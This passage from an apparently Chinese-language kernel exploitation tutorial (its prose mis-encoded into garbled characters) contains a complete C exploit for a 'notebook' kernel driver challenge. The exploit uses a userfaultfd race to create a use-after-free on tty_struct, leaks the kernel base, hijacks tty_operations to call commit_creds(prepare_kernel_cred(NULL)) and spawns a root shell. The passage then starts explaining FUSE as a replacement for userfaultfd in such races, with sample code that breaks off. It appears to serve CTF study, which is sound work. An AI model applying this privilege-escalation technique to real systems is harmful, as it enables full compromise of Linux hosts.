class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NOTE_NUM 0x10</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> &#123;</span><br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">size_t</span> size;<br>&#125;;<br><br><span class="hljs-type">int</span> note_fd;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">char</span> *uffd_buf;<br><span class="hljs-type">char</span> temp_page[<span class="hljs-number">0x1000</span>] = &#123; <span class="hljs-string">&quot;arttnba3&quot;</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteGift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteRead</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> read(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> write(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">fixSizeByAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    sem_wait(&amp;evil_add_sem);<br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">constructUAF</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span><br>&#123;<br>    sem_wait(&amp;evil_edit_sem);<br>    noteEdit(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> <span class="hljs-title">kernel_notebook</span>[<span class="hljs-title">NOTE_NUM</span>];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> <span class="hljs-title">fake_tty_ops</span>;</span><br>    <span class="hljs-type">pthread_t</span> uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;<br>    <span class="hljs-type">size_t</span> fake_tty_struct_data[<span class="hljs-number">0x100</span>], tty_ops, orig_tty_struct_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> tty_struct_addr, fake_tty_ops_addr;<br>    <span class="hljs-type">int</span> tty_fd;<br><br>    <span class="hljs-comment">/* fundamental infastructure */</span><br>    saveStatus();<br>    bindCore(<span class="hljs-number">0</span>);<br><br>    sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* open dev */</span><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open /dev/notebook!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* register userfaultfd */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] register userfaultfd...&quot;</span>);<br><br>    uffd_buf = (<span class="hljs-type">char</span> *) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                            MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFdForThreadStucking(&amp;uffd_monitor_thread, uffd_buf,<span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* get a tty-size object */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating tty_struct-size object...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3rat3bant&quot;</span>);<br>    noteEdit(<span class="hljs-number">0</span>, TTY_STRUCT_SIZE, temp_page);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * construct UAF by userfaultfd.</span><br><span class="hljs-comment">     * Note that we need to sleep(1) there to wait for the kfree() to be done,</span><br><span class="hljs-comment">     * so that the UAF object can be regetted later.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] constructing UAF on tty_struct...&quot;</span>);<br><br>    pthread_create(&amp;edit_uaf_thread, <span class="hljs-literal">NULL</span>, constructUAF, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;add_fix_size_thread, <span class="hljs-literal">NULL</span>, fixSizeByAdd, <span class="hljs-literal">NULL</span>);<br><br>    sem_post(&amp;evil_edit_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fix notebook[0]-&gt;size.</span><br><span class="hljs-comment">     * Note that we need to sleep(1) there to wait for the `size` to be fixed.</span><br><span class="hljs-comment">    */</span><br>    sem_post(&amp;evil_add_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* leak kernel_base by tty_struct */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel_base by tty_struct&quot;</span>);<br><br>    tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR| O_NOCTTY);<br>    noteRead(<span class="hljs-number">0</span>, orig_tty_struct_data);<br><br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) orig_tty_struct_data != <span class="hljs-number">0x5401</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to hit the tty_struct!&quot;</span>);<br>    &#125;<br><br>    tty_ops = orig_tty_struct_data[<span class="hljs-number">3</span>];<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) <br>                       ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">/* construct fake tty_ops */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct fake tty_operations...&quot;</span>);<br><br>    fake_tty_ops.ioctl = kernel_offset + WORK_FOR_CPU_FN;<br>    noteAdd(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, temp_page);<br>    noteEdit(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), temp_page);<br>    noteWrite(<span class="hljs-number">1</span>, &amp;fake_tty_ops);<br><br>    <span class="hljs-comment">/* get kernel addr of tty_struct and tty_ops by gift */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel heap addr by gift...&quot;</span>);<br><br>    noteGift(&amp;kernel_notebook);<br>    tty_struct_addr = kernel_notebook[<span class="hljs-number">0</span>].ptr;<br>    fake_tty_ops_addr = kernel_notebook[<span class="hljs-number">1</span>].ptr;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] tty_struct at 0x%lx\n&quot;</span>, tty_struct_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] fake_tty_ops at 0x%lx\n&quot;</span>, fake_tty_ops_addr);<br><br>    <span class="hljs-comment">/* prepare_kernel_cred(NULL) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] triger commit_creds(prepare_kernel_cred(NULL)) and fix tty...&quot;</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(tty_fd, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-comment">/* commit_creds(&amp;root_cred) */</span><br>    noteRead(<span class="hljs-number">0</span>, fake_tty_struct_data);<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + COMMIT_CREDS;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = fake_tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">6</span>] = orig_tty_struct_data[<span class="hljs-number">6</span>];<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(tty_fd, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-comment">/* fix tty_struct */</span><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    <span class="hljs-comment">/* pop root shell */</span><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯å®Œæˆç¨³å®šåŒ–ææƒ</p>
<p><img src="https://s2.loli.net/2023/02/07/SbkgTuyZ9oJHRxw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><blockquote>
<p>FUSE çš„åŸºæœ¬ä¿¡æ¯å‚è€ƒ <a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/fast17/fast17-vangoor.pdf">To FUSE or Not to FUSE: Performance of User-Space File Systems</a>ï¼Œä¹Ÿå¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143256077">çŸ¥ä¹ä¸Šçš„è¿™ç¯‡æ–‡ç« </a>ï¼ŒåŸºäº FUSE çš„åˆ©ç”¨åˆ™å¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185</a></p>
<blockquote>
<p>æ³¨ï¼šæœ€å¥½å…ˆäº†è§£ VFS ç›¸å…³çš„ä¸€äº›åŸºæœ¬çŸ¥è¯†</p>
</blockquote>
</blockquote>
<h3 id="FUSE-ç®€ä»‹"><a href="#FUSE-ç®€ä»‹" class="headerlink" title="FUSE ç®€ä»‹"></a>FUSE ç®€ä»‹</h3><p>å‰é¢è®²åˆ°ï¼Œè‡ª Linux kernel 5.11 ç‰ˆæœ¬èµ·ï¼Œéç‰¹æƒç”¨æˆ·è¢«ç¦æ­¢ä½¿ç”¨ userfaultfd ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡ FUSE è¾¾æˆåŒæ ·çš„æ•ˆæœ</strong></p>
<p>æˆ‘ä»¬å…ˆæ¥ä»‹ç» FUSE â€”â€” <em>Filesystem in Userspace</em> ï¼Œå³<strong>ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼Œè¯¥åŠŸèƒ½<strong>å…è®¸éç‰¹æƒç”¨æˆ·åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼Œå¼€å‘è€…åªéœ€è¦å®ç°å¯¹åº”çš„æ–‡ä»¶æ“ä½œæ¥å£å°±å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Œè¿™ç»™å¼€å‘è€…æä¾›äº†ç›¸å½“çš„ä¾¿åˆ©</p>
<p>FUSE è‡ª Linux 2.6.14 ç‰ˆæœ¬å¼•å…¥ï¼Œä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>FUSE å†…æ ¸æ¨¡å—ï¼Œè´Ÿè´£ä¸ kernel çš„ VFS è¿›è¡Œäº¤äº’ï¼Œå¹¶å‘ç”¨æˆ·ç©ºé—´å®ç°çš„æ–‡ä»¶ç³»ç»Ÿè¿›ç¨‹æš´éœ² <code>/dev/fuse</code> å—è®¾å¤‡æ¥å£</li>
<li><a target="_blank" rel="noopener" href="https://github.com/libfuse/libfuse">ç”¨æˆ·ç©ºé—´çš„ libfuse åº“</a> è´Ÿè´£å‘ç”¨æˆ·ç¨‹åºæä¾›å°è£…å¥½çš„æ¥å£ï¼Œå¼€å‘è€…åŸºäºè¯¥åº“è¿›è¡Œç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘ï¼šç”±ä¸€ä¸ª FUSE daemon å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ä¸å†…æ ¸æ¨¡å—è¿›è¡Œäº¤äº’å¹¶è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“æ“ä½œ</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE çš„åŸºæœ¬è¿è¡ŒåŸç†å¦‚ä¸‹ï¼š</p>
<ul>
<li>FUSE daemon å®ˆæŠ¤è¿›ç¨‹é€šè¿‡ libfuse åº“çš„ <code>fuse_main()</code> æ³¨å†Œæ–‡ä»¶ç³»ç»Ÿä¸å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œå¹¶æŒ‚è½½åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼ˆä¾‹å¦‚ <code>/mnt/fuse</code>ï¼‰</li>
<li>ç”¨æˆ·è¿›ç¨‹è®¿é—®æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>/mnt/fuse/file</code>ï¼‰ï¼Œæ¥åˆ°å†…æ ¸ä¸­çš„ VFS å¯¹åº” inode çš„ <code>inode_operations</code> ä¸­çš„å¤„ç†å‡½æ•°ï¼Œäº¤ç”± FUSE å†…æ ¸æ¨¡å—è¿›è¡Œå¤„ç†</li>
<li>FUSE å†…æ ¸æ¨¡å—å°†è¯·æ±‚è½¬æ¢ä¸ºä¸ç”¨æˆ·æ€ daemon è¿›ç¨‹é—´çº¦å®šçš„æ ¼å¼ï¼Œäº¤ç”±ç”¨æˆ·æ€å¯¹åº”çš„ FUSE daemon å®ˆæŠ¤è¿›ç¨‹è¿›è¡Œå¤„ç†</li>
<li>åœ¨ FUSE daemon è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºæ—¶æ³¨å†Œçš„å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œè¿™ä¸€æ­¥å¯èƒ½ä¼šéœ€è¦è®¿é—®å®é™…çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ <code>ext4</code>ï¼Œçœ‹æ–‡ä»¶ç³»ç»Ÿå…·ä½“å®šä¹‰ï¼Œä½ ä¹Ÿå¯ä»¥å†™æˆä¸€ä¸ªçº¯å†…å­˜çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆç¬‘ï¼‰ï¼‰</li>
<li>FUSE daemon å®Œæˆå¤„ç†ï¼Œè¿”å›ç»“æœè‡³ FUSE å†…æ ¸æ¨¡å—ï¼Œå†ç»ç”± VFS è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹</li>
</ul>
<p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE å†…éƒ¨è¿˜æœ‰æ›´ä¸ºå¤æ‚çš„ç»“æ„ï¼Œå¦‚äº”ä¸ªå¤„ç†é˜Ÿåˆ—ç­‰ï¼Œä½†è¿™æš‚æ—¶ä¸æ˜¯æˆ‘ä»¬æœ¬ç¯‡éœ€è¦å…³æ³¨çš„ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ç”¨ FUSE æ¥å®Œæˆåˆ©ç”¨å°±è¡Œï¼ˆç¬‘ï¼‰</p>
<p><img src="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="FUSE-åŸºæœ¬ç”¨æ³•"><a href="#FUSE-åŸºæœ¬ç”¨æ³•" class="headerlink" title="FUSE åŸºæœ¬ç”¨æ³•"></a>FUSE åŸºæœ¬ç”¨æ³•</h3><p>å€ŸåŠ© libfuse åº“ï¼ŒFUSE çš„ç”¨æ³•å…¶å®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œé¦–å…ˆæ˜¯å®‰è£…åŸºæœ¬çš„ä¾èµ–é¡¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install libfuse2 libfuse-dev</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é¦–å…ˆéœ€è¦è‡ªå®šä¹‰ä¸€å¼  <code>fuse_operations</code> å‡½æ•°è¡¨ï¼Œå¹¶å®ç°å¯¹åº”çš„å‡½æ•°æ¥å£ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶ç³»ç»Ÿè¦å®ç°åˆ›å»ºæ–‡ä»¶å¤¹çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åº”å½“åœ¨å‡½æ•°è¡¨ä¸­å®ç° <code>mkdir()</code> æ¥å£ï¼‰ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ<strong>å…¶å®éƒ½æ˜¯é€šè¿‡å¯¹è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰çš„ç›¸åº”å‡½æ•°è¿›è¡Œå›è°ƒå®Œæˆçš„</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å¤ªé•¿ï¼Œè¿™é‡Œå°±ä¸æ”¾å®Œäº†</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> &#123;</span><br>	<span class="hljs-type">int</span> (*getattr) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-keyword">struct</span> stat *);<br>	<span class="hljs-type">int</span> (*readlink) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> *, <span class="hljs-type">size_t</span>);<br>	<span class="hljs-type">int</span> (*getdir) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">fuse_dirh_t</span>, <span class="hljs-type">fuse_dirfil_t</span>);<br>	<span class="hljs-type">int</span> (*mknod) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">mode_t</span>, <span class="hljs-type">dev_t</span>);<br>	<span class="hljs-type">int</span> (*mkdir) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">mode_t</span>);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œç¬”è€…å†™ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿä½œä¸ºç¤ºä¾‹ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å®ç°å¦‚ä¸‹ä¸¤ä¸ªæ¥å£ï¼š</p>
<ul>
<li><code>getattr</code> ç”¨ä»¥è·å–æ–‡ä»¶å±æ€§ï¼Œå¯¹äºæ ¹ç›®å½• <code>&quot;/&quot;</code> ï¼ˆç›¸å¯¹äºæŒ‚è½½ç‚¹è€Œè¨€ï¼‰è€Œè¨€æˆ‘ä»¬è¿”å› <code>0755 | S_IFDIR</code> å±æ€§ï¼Œå¦åˆ™è¿”å› <code>0644 | S_IFREG</code> å±æ€§</li>
<li><code>readdir</code> ç”¨ä»¥éå†ç›®å½•ï¼Œè¿™é‡Œæˆ‘ä»¬ä»…æ”¯æŒéå†æ ¹ç›®å½• <code>&quot;/&quot;</code>ï¼Œè¿”å›ç»“æœæ˜¾ç¤ºåœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>filler()</code> å‡½æ•°å¡«å……å•ä¸ªæ–‡ä»¶ç»“æœ</li>
</ul>
<p>ä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>fuse_main()</code> å°†å…¶æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ä¸‹å³å¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ ‡è¯†ä½¿ç”¨çš„ FUSE ç‰ˆæœ¬</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 29</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, <span class="hljs-type">fuse_fill_dir_t</span> filler, </span><br><span class="hljs-params">                          <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info* fi)</span><br>&#123;<br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        filler(buf, <span class="hljs-string">&quot;a3fuse_test_file&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span 